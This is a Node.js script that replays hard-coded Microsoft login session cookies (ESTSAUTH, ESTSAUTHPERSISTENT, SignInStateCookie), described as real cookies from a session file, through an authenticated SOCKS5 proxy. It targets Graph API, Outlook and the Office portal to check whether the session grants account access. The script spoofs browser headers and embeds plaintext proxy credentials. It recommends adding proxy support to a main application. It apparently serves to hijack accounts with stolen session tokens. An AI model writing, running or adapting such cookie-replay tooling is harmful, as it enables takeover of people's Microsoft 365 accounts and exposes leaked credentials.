#!/usr/bin/env node

/**
 * Test Office365 Cookie Authentication with Proxy
 */

const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Real cookies from session.txt
const realCookies = [
  {
    "path": "/",
    "domain": "login.microsoftonline.com",
    "expirationDate": 1791605715,
    "value": "CAgABFgIAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P-1ttdmtx9doNfq14n8SSngruKXhIUW96z7VCIPlsqGBmaSl-dmfxhc6auts2umljVi2yDQIiiQMV71GMCPUq4j4AjkeHBQlDLShK5Yu3bPzncQJX94wCDt95i6L2CaYSCyjzV13Anla_rsLTUW6leWWwH-UMVYv_xZmt_Xbug5KV92KOh1rcpuFGJ6RFEO9ANLs_ILdDOxr0mMIb_0_fvvslhuuxjKIu-Kj91P0id5S5D9ctFrnsiE_tSr0V_eVmnKNBua9NZ_RQ",
    "name": "SignInStateCookie",
    "httpOnly": true
  },
  {
    "path": "/",
    "domain": "login.microsoftonline.com",
    "expirationDate": 1791605715,
    "value": "1.AWEBGwQ0inrWFkeHD_7sQBQ2vFtEZUfGMrBJg-Ydk3ZSdsrKASlhAQ.AgABFwQAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P85p887rtN274u6A2hwp3CwQbOpmtHCsoWzW9Ur1B3SdtQ4zZuDdaz42ICum6hI6RtCdbHl6_3FwKK-",
    "name": "ESTSAUTH",
    "httpOnly": true
  },
  {
    "path": "/",
    "domain": "login.microsoftonline.com",
    "expirationDate": 1791605715,
    "value": "1.AWEBGwQ0inrWFkeHD_7sQBQ2vFtEZUfGMrBJg-Ydk3ZSdsrKASlhAQ.AgABFwQAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P9C7AVXSM-F_7zb5hs88zoLRhS0g_kQ1MDxjPQcupdEuyCkp_v5URSEUyWboCjRhRV7d8aU1L6eLNUSa32pgU7Wt3hU9EqQWBwpUwml0YH1hqpFubtdSIIaE1qPNOFeGyAWa4DPG7cuDvGL4-LxzPJfl_nakhekeXhXht5ZOsJZRvbIRBZtg-SpqEBxOuCO6Kx_g_QwIGUI45-0ULfp8dnfJ9e0b9iiA4ucyHDTmyvVcXCJIzl6lCeM0iCkvVFZtG4d12DoeDRb8T2Iu8eQ7sbuPmCb_ClQxSJq4VdwgTGEod_bTpLMdyb2SnsjFb9h2GOqmlu_Xvv63exfHwaDGlOXQlL0DVa3WFmEQ4B7Jo5TOC5qiDRH5akZqYunNHJ9ra976ulQKq16bc4vQ8uXDkE-7E23M66NHHUCD4fOOwxOtXTpXbAvE6gUA0WKY8to_MEmN3wMM_CzTFTYumHiuauWYY0kg7sZq-mNxf7w5L24Z1YkdpBLtwBIl0KKTM8bE32tP4otFVdibdFEho3ODq6NOkf6Ed41fP1zLfLoJGVMADH49qzl57dGJ9Vf-XLKD1YELadF72BEWiAAem1qUw5Tw499yQKH6c-pGcnO5EH1TV0",
    "name": "ESTSAUTHPERSISTENT",
    "httpOnly": true
  }
];

// Proxy configuration
const PROXY_CONFIG = {
  host: "216.10.27.159",
  port: 6593,
  username: "lfafuacv",
  password: "oixy0zsh3ust"
};

// Test proxy connectivity first
async function testProxyConnectivity() {
  console.log('🔐 Testing SOCKS5 proxy connectivity...');
  console.log(`   Proxy: ${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`);
  console.log(`   Username: ${PROXY_CONFIG.username}`);

  try {
    const proxyUrl = `socks5://${PROXY_CONFIG.username}:${PROXY_CONFIG.password}@${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`;
    const agent = new SocksProxyAgent(proxyUrl);

    const client = axios.create({
      httpsAgent: agent,
      httpAgent: agent,
      timeout: 10000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    console.log('   Testing proxy with httpbin.org...');
    const response = await client.get('http://httpbin.org/ip');
    console.log(`   ✅ Proxy working! IP: ${response.data.origin}`);
    return true;
  } catch (error) {
    console.log(`   ❌ Proxy connection failed: ${error.message}`);
    console.log(`   🔍 Error details: ${error.code || 'No error code'}`);

    // Try without authentication
    console.log('   🔄 Trying proxy without authentication...');
    try {
      const proxyUrlNoAuth = `socks5://${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`;
      const agentNoAuth = new SocksProxyAgent(proxyUrlNoAuth);

      const clientNoAuth = axios.create({
        httpsAgent: agentNoAuth,
        httpAgent: agentNoAuth,
        timeout: 10000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const responseNoAuth = await clientNoAuth.get('http://httpbin.org/ip');
      console.log(`   ✅ Proxy working without auth! IP: ${responseNoAuth.data.origin}`);
      return 'no-auth';
    } catch (error2) {
      console.log(`   ❌ Proxy also failed without auth: ${error2.message}`);
      return false;
    }
  }
}

// Create HTTP client with cookies and optional proxy
function createClient(cookies, useProxy = false, proxyAuth = true) {
  const cookieString = cookies
    .map(cookie => `${cookie.name}=${cookie.value}`)
    .join('; ');

  const config = {
    headers: {
      'Cookie': cookieString,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'application/json, text/html, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'DNT': '1',
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1'
    },
    timeout: 30000,
    maxRedirects: 5,
    validateStatus: function (status) {
      return status < 500;
    }
  };

  if (useProxy) {
    const proxyUrl = proxyAuth
      ? `socks5://${PROXY_CONFIG.username}:${PROXY_CONFIG.password}@${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`
      : `socks5://${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`;

    const agent = new SocksProxyAgent(proxyUrl);
    config.httpsAgent = agent;
    config.httpAgent = agent;
  }

  return axios.create(config);
}

async function testAuthentication(client, name) {
  console.log(`\n🧪 Testing authentication with ${name}...`);

  // Test endpoints that are most likely to show authentication status
  const endpoints = [
    {
      name: "Graph API User Info",
      url: "https://graph.microsoft.com/v1.0/me",
      expectJson: true
    },
    {
      name: "Outlook Live OWA",
      url: "https://outlook.live.com/owa/?nlp=1",
      expectJson: false
    },
    {
      name: "Office365 Portal",
      url: "https://portal.office.com/",
      expectJson: false
    }
  ];

  const results = [];

  for (const endpoint of endpoints) {
    try {
      console.log(`   📡 ${endpoint.name}: ${endpoint.url}`);
      const response = await client.get(endpoint.url);

      const responseText = typeof response.data === 'string'
        ? response.data
        : JSON.stringify(response.data);

      // Check for authentication indicators
      const authSuccess = [
        'userprincipaldisplayname',
        'userprincipalname',
        'displayname',
        '@odata',
        'mailfolders',
        'sessiondata',
        'office-ui-fabric',
        'spa-landing'
      ];

      const authFailure = [
        'sign in',
        'signin',
        'login',
        'authenticate',
        'aadsts',
        'unauthorized',
        'access denied',
        'invalidauthenticationtoken'
      ];

      const textLower = responseText.toLowerCase();
      const hasSuccess = authSuccess.some(indicator => textLower.includes(indicator));
      const hasFailure = authFailure.some(indicator => textLower.includes(indicator));

      const isAuthenticated = response.status === 200 && hasSuccess && !hasFailure;

      console.log(`      Status: ${response.status} ${response.statusText}`);
      console.log(`      Content-Type: ${response.headers['content-type'] || 'unknown'}`);
      console.log(`      Size: ${responseText.length} chars`);
      console.log(`      Auth Status: ${isAuthenticated ? '✅ AUTHENTICATED' : '❌ NOT AUTHENTICATED'}`);

      if (hasSuccess) {
        const foundIndicators = authSuccess.filter(ind => textLower.includes(ind));
        console.log(`      ✨ Success indicators: ${foundIndicators.join(', ')}`);
      }

      if (hasFailure) {
        const foundIndicators = authFailure.filter(ind => textLower.includes(ind));
        console.log(`      ⚠️ Failure indicators: ${foundIndicators.join(', ')}`);
      }

      // Show sample content
      if (endpoint.expectJson && response.headers['content-type']?.includes('json')) {
        try {
          const jsonData = typeof response.data === 'object' ? response.data : JSON.parse(response.data);
          console.log(`      📋 JSON: ${JSON.stringify(jsonData, null, 2).substring(0, 300)}...`);
        } catch (e) {
          console.log(`      📋 Content: ${responseText.substring(0, 200)}...`);
        }
      } else {
        console.log(`      📋 Content: ${responseText.substring(0, 200)}...`);
      }

      results.push({
        name: endpoint.name,
        url: endpoint.url,
        status: response.status,
        authenticated: isAuthenticated,
        success: response.status === 200,
        hasAuthSuccess: hasSuccess,
        hasAuthFailure: hasFailure
      });

    } catch (error) {
      console.log(`      ❌ Error: ${error.message}`);
      if (error.response) {
        console.log(`      📄 Error Status: ${error.response.status}`);
      }

      results.push({
        name: endpoint.name,
        url: endpoint.url,
        error: error.message,
        authenticated: false,
        success: false
      });
    }
  }

  return results;
}

async function runProxyTest() {
  console.log('🚀 Office365 Cookie + Proxy Authentication Test');
  console.log('=' .repeat(60));

  // Step 1: Test proxy connectivity
  const proxyStatus = await testProxyConnectivity();

  if (!proxyStatus) {
    console.log('\n❌ Proxy is not working. Testing without proxy only...');

    const directClient = createClient(realCookies, false);
    const directResults = await testAuthentication(directClient, 'DIRECT CONNECTION');

    console.log('\n📊 DIRECT CONNECTION SUMMARY:');
    console.log('-'.repeat(40));
    const authEndpoints = directResults.filter(r => r.authenticated);
    console.log(`Authenticated endpoints: ${authEndpoints.length}`);
    authEndpoints.forEach(e => console.log(`   ✅ ${e.name}`));

    return;
  }

  // Step 2: Test with proxy
  const useProxyAuth = proxyStatus === true; // true if proxy worked with auth, 'no-auth' if without

  console.log(`\n🔐 Testing with proxy (auth: ${useProxyAuth})...`);
  const proxyClient = createClient(realCookies, true, useProxyAuth);
  const proxyResults = await testAuthentication(proxyClient, 'PROXY CONNECTION');

  // Step 3: Compare with direct connection
  console.log('\n🌐 Testing direct connection for comparison...');
  const directClient = createClient(realCookies, false);
  const directResults = await testAuthentication(directClient, 'DIRECT CONNECTION');

  // Step 4: Summary
  console.log('\n📊 FINAL SUMMARY:');
  console.log('=' .repeat(60));

  const proxyAuth = proxyResults.filter(r => r.authenticated);
  const directAuth = directResults.filter(r => r.authenticated);

  console.log(`🔐 PROXY AUTHENTICATED: ${proxyAuth.length}`);
  proxyAuth.forEach(e => console.log(`   ✅ ${e.name}`));

  console.log(`\n🌐 DIRECT AUTHENTICATED: ${directAuth.length}`);
  directAuth.forEach(e => console.log(`   ✅ ${e.name}`));

  console.log('\n🎯 RECOMMENDATION:');
  if (proxyAuth.length > directAuth.length) {
    console.log('   ✅ Use PROXY for better authentication success');
    console.log('   📝 Implement proxy support in main application');
  } else if (directAuth.length > 0) {
    console.log('   🌐 DIRECT connection works, proxy optional');
  } else {
    console.log('   ❌ Neither proxy nor direct connection authenticated');
    console.log('   🔍 Check cookie validity and format');
  }
}

runProxyTest().catch(console.error);